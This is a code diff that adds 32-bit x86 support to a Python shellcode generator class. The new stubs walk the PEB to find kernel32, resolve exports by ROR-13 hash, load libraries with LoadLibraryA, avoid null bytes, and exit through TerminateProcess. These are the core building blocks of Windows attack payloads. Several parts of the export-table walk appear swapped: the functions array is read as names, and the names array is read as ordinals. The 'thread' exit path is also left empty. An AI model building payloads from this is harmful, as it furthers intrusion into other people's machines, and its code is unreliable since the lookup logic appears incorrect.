@@ -28,6 +28,7 @@ class WinRawr():
         """
 
         if smartarch.arch_used == "x64":
+
             stub = f"""
 getKernel32:
     push rbp
@@ -52,6 +53,29 @@ found:
     leave
     ret\n"""
 
+        elif smartarch.arch_used == "x86":
+
+            stub = f"""
+getKernel32:
+    mov dl, 0x4b
+getPEB:
+    xor ebx, ebx
+    xor ecx, ecx
+    mov bl, 0x30
+    mov edi, fs:[ebx]
+    mov edi, [edi + {winternl._PEB.Ldr.offset}]
+    mov edi, [edi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
+search:
+    mov eax, [edi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
+    mov esi, [edi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]    
+    mov edi, [edi]
+    cmp [esi + 0x18], cx
+    jne search
+    cmp [esi], dl
+    jne search
+found:
+    jmp resolveFunctions\n"""
+
         return stub
 
     def get_lookup_stub(self):
@@ -59,6 +83,7 @@ found:
         """
 
         if smartarch.arch_used == "x64":
+            
             stub = f"""
 lookupFunction:
     push rbp
@@ -105,6 +130,62 @@ error:
     leave
     ret\n"""
 
+        elif smartarch.arch_used == "x86":
+
+            stub = f"""
+lookupFunction:
+    push ebp
+    mov ebp, esp
+    sub esp, 0x08
+    xor ebx, ebx
+    mov [ebp - 0x04], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
+    mov [ebp - 0x08], edx       ; Argv passed into lookupFunction
+    mov ebx, [edi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
+    add ebx, {winnt._IMAGE_NT_HEADERS.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
+    add ebx, edi
+    mov eax, [ebx]
+    mov ebx, edi
+    add ebx, eax
+    mov eax, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
+    mov edx, edi
+    add edx, eax
+    mov ecx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
+    mov [ebp - 0x04], ebx       ; Backup EBX since we are going to XOR it
+parseNames:
+    jecxz error
+    dec ecx
+    mov eax, [edx + ecx * 4]
+    mov esi, edi
+    add esi, eax
+    xor eax, eax
+    xor ebx, ebx
+    cld
+calcHash:
+    lodsb
+    test al, al
+    jz calcDone
+    ror ebx, 0xD
+    add ebx, eax
+    jmp calcHash
+calcDone:
+    cmp ebx, [ebp - 0x08]
+    jnz parseNames
+findAddress:
+    mov ebx, [ebp - 0x04]       ; Restore EBX value prevously saved
+    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
+    add edx, edi
+    xor eax, eax
+    mov ax, [edx + ecx * 2]
+    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
+    add edx, edi
+    mov eax, [edx + eax * 4]
+    add eax, edi
+error:
+    leave
+    ret
+resolveFunctions:
+    mov edi, eax\n"""
+
         return stub
 
     def get_loader_stub(self, lib):
@@ -112,6 +193,7 @@ error:
         """
 
         if smartarch.arch_used == "x64":
+
             lists = convert.from_str_to_xwords(lib)
             write_index = self.storage_offsets['functionName']
 
@@ -143,6 +225,36 @@ error:
     mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
     call rax"""
 
+        elif smartarch.arch_used == "x86":
+
+            lists = convert.from_str_to_xwords(lib, 0x04)
+            write_index = self.storage_offsets["functionName"]
+
+            stub = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
+
+            for i in range(len(lists["DWORD_LIST"])):
+                stub += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
+                stub += "    mov [ebp-{}], ecx\n".format(hex(write_index))
+                write_index -= 4
+
+            for i in range(len(lists["WORD_LIST"])):
+                stub += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
+                stub += "    mov [ebp-{}], cx\n".format(hex(write_index))
+                write_index -= 2
+
+            for i in range(len(lists["BYTE_LIST"])):
+                stub += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
+                stub += "    mov [ebp-{}], cl\n".format(hex(write_index))
+                write_index -= 1
+
+            stub += f"""
+    xor ecx, ecx
+    mov [ebp - {write_index}], cl
+    lea ecx, [ebp - {self.storage_offsets['functionName']}]
+    push ecx
+    mov eax, [ebp - {self.storage_offsets['LoadLibraryA']}]
+    call eax"""
+
         return stub
 
     def get_resolver(self):
@@ -150,6 +262,7 @@ error:
         """
 
         if smartarch.arch_used == "x64":
+
             stub = ""
             for lib, imports in self.dependencies.items():
                 if (lib != "Kernel32.dll"):
@@ -165,6 +278,25 @@ get_{imports[func]}:
     call lookupFunction
     mov [rbp - {self.storage_offsets[imports[func]]}], rax
                 """
+
+        elif smartarch.arch_used == "x86":
+
+            stub = ""
+            for lib, imports in self.dependencies.items():
+                if (lib != "Kernel32.dll"):
+                    stub += self.get_loader_stub(lib)
+                    stub += """
+    mov edi, eax
+                """
+
+                for func in range(len(imports)):
+                    stub += f"""
+get_{imports[func]}:
+    mov edx, {convert.from_str_to_win_hash(imports[func])}
+    call lookupFunction
+    mov [ebp - {self.storage_offsets[imports[func]]}], eax
+                """
+
         return stub
 
 
@@ -189,6 +321,22 @@ get_{imports[func]}:
             stub += """    call getKernel32
     mov rdi, rax\n"""
 
+        elif smartarch.arch_used == "x86":
+
+            stub = "_start:\n"
+
+            if self.op_as_func == True:
+                stub += f"""    push ebp
+    mov ebp, esp\n"""
+
+            stub += f"""    ; Allocate the stack space with the use of AL of EAX in order to avoid a NULL byte
+    xor eax, eax
+    mov al, {self.stack_space}
+    sub esp, eax\n"""
+
+            if self.op_as_func == False:
+                stub += "    and esp, 0xFFFFFFF0\n"
+
         return stub
     
     def get_epilogue(self):
@@ -197,6 +345,7 @@ get_{imports[func]}:
         """
 
         if smartarch.arch_used == "x64":
+
             stub = ""
     
             if self.exit_technique == "thread":
@@ -230,5 +379,33 @@ call_TerminateProcess:
                 stub += """fin:
         leave
         ret\n"""
+
+        if smartarch.arch_used == "x86":
+
+            stub = ""
+
+            if self.exit_technique == "thread":
+                stub += f"""
+                """
+
+
+            elif self.exit_technique == "terminate":
+                stub += f"""
+; EAX => TerminateProcess([in] HANDLE hProcess,
+;                         [in] UINT   uExitCode);
+call_TerminateProcess:
+    xor ecx, ecx
+    push ecx
+    dec ecx
+    push ecx
+    mov eax, [ebp - {self.storage_offsets['TerminateProcess']}]
+    call eax\n"""
+
+            if self.op_as_func == True:
+                stub += """fin:
+        leave
+        ret\n"""
+
+
     
         return stub
